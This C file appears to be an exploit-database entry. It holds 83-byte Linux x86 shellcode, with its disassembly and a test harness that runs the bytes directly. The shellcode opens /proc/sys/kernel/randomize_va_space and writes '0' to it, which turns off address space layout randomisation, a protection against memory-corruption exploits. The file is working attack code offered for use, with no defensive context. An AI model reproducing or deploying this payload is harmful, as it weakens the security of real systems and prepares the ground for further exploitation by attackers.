/*
Title:	Linux x86 ASLR deactivation - 83 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       50                      push   %eax
 8048063:       68 70 61 63 65          push   $0x65636170
 8048068:       68 76 61 5f 73          push   $0x735f6176
 804806d:       68 69 7a 65 5f          push   $0x5f657a69
 8048072:       68 6e 64 6f 6d          push   $0x6d6f646e
 8048077:       68 6c 2f 72 61          push   $0x61722f6c
 804807c:       68 65 72 6e 65          push   $0x656e7265
 8048081:       68 79 73 2f 6b          push   $0x6b2f7379
 8048086:       68 6f 63 2f 73          push   $0x732f636f
 804808b:       68 2f 2f 70 72          push   $0x72702f2f
 8048090:       89 e3                   mov    %esp,%ebx
 8048092:       66 b9 bc 02             mov    $0x2bc,%cx
 8048096:       b0 08                   mov    $0x8,%al
 8048098:       cd 80                   int    $0x80
 804809a:       89 c3                   mov    %eax,%ebx
 804809c:       50                      push   %eax
 804809d:       66 ba 30 3a             mov    $0x3a30,%dx
 80480a1:       66 52                   push   %dx
 80480a3:       89 e1                   mov    %esp,%ecx
 80480a5:       31 d2                   xor    %edx,%edx
 80480a7:       42                      inc    %edx
 80480a8:       b0 04                   mov    $0x4,%al
 80480aa:       cd 80                   int    $0x80
 80480ac:       b0 06                   mov    $0x6,%al
 80480ae:       cd 80                   int    $0x80
 80480b0:       40                      inc    %eax
 80480b1:       cd 80                   int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68"
                   "\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61"
                   "\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f"
                   "\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08"
                   "\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x31"
                   "\xd2\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80";


int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}